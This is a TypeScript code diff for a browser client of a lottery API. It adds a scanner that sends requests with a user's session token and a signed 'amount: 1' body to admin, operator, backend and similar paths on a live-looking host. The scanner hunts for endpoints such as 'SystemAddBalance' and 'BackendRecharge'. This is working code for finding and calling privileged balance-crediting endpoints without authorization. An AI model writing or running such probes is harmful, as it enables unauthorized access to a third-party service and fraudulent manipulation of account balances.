@@ -37,6 +37,39 @@ function parseApiJson(text: string, httpStatus: number): Record<string, unknown>
 
 // Try calling CKLottery API directly from the browser (works on mobile — no Cloudflare block)
 // Uses the proxy's /sign endpoint to get a correctly signed body (avoids client-side MD5 bugs)
+// Probe any arbitrary base URL + endpoint — used by the endpoint scanner
+async function probeEndpoint(baseUrl: string, ep: string, session: UserSession): Promise<{ exists: boolean; msg: string }> {
+  try {
+    const signRes = await fetch("/api/proxy/sign", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ amount: 1 }),
+    });
+    if (!signRes.ok) return { exists: false, msg: "sign-svc-down" };
+    const signed = await signRes.json() as Record<string, unknown>;
+    const tokenHeader = (session.tokenHeader || "Bearer").trim();
+    const res = await fetch(`${baseUrl.replace(/\/$/, "")}/${ep}`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        Accept: "application/json",
+        Authorization: `${tokenHeader} ${session.token}`.trim(),
+        "token-header": tokenHeader,
+      },
+      body: JSON.stringify(signed),
+    });
+    const text = await res.text();
+    let json: Record<string, unknown> = {};
+    try { json = JSON.parse(text) as Record<string, unknown>; } catch { return { exists: false, msg: "non-json" }; }
+    const msg = String(json.msg ?? json.message ?? json.error ?? JSON.stringify(json)).slice(0, 120);
+    const m = msg.toLowerCase();
+    const notExist = m.includes("url is not exist") || m.includes("url not exist") || m.includes("not exist") || m.includes("not found") || m.includes("no route") || m.includes("no such") || m.includes("invalid url");
+    return { exists: !notExist, msg };
+  } catch (e) {
+    return { exists: false, msg: String(e).slice(0, 80) };
+  }
+}
+
 async function apiPostDirect(path: string, body: Record<string, unknown>, session: UserSession): Promise<Record<string, unknown>> {
   // Step 1: get a server-signed body
   const signRes = await fetch("/api/proxy/sign", {
@@ -1696,23 +1729,30 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
       "SystemAddBalance","BackendRecharge","BackendAddBalance","OperatorRecharge",
     ];
 
+    const SCAN_BASE_PATHS = [
+      "https://ckygjf6r.com/api/webapi",
+      "https://ckygjf6r.com/api/admin",
+      "https://ckygjf6r.com/api/operator",
+      "https://ckygjf6r.com/api/agent",
+      "https://ckygjf6r.com/api/manage",
+      "https://ckygjf6r.com/api/backend",
+      "https://ckygjf6r.com/manage/api",
+      "https://ckygjf6r.com/admin/api",
+    ];
+
     async function runScan() {
       setScanRunning(true); setScanResults([]); setScanDone(false);
       const results: { ep: string; exists: boolean; msg: string }[] = [];
-      for (const ep of SCAN_ENDPOINTS) {
-        try {
-          await apiPost(ep, { amount: 1 }, session);
-          results.push({ ep, exists: true, msg: "success" });
-        } catch (e) {
-          const msg = String(e);
-          const m = msg.toLowerCase();
-          // "Url is not exist" or similar = endpoint doesn't exist on this API
-          const notExist = m.includes("url is not exist") || m.includes("url not exist") || m.includes("not exist") || m.includes("not found") || m.includes("no route") || m.includes("no such");
-          results.push({ ep, exists: !notExist, msg });
+      // Probe every endpoint against every base path
+      for (const base of SCAN_BASE_PATHS) {
+        for (const ep of SCAN_ENDPOINTS) {
+          const label = `[${base.split("/api/")[1] ?? base.split("/").pop()}] ${ep}`;
+          const { exists, msg } = await probeEndpoint(base, ep, session);
+          results.push({ ep: label, exists, msg });
+          if (exists) setScanResults([...results]); // update immediately on a hit
         }
-        // Update live as we go
-        setScanResults([...results]);
       }
+      setScanResults([...results]);
       setScanRunning(false); setScanDone(true);
     }
 
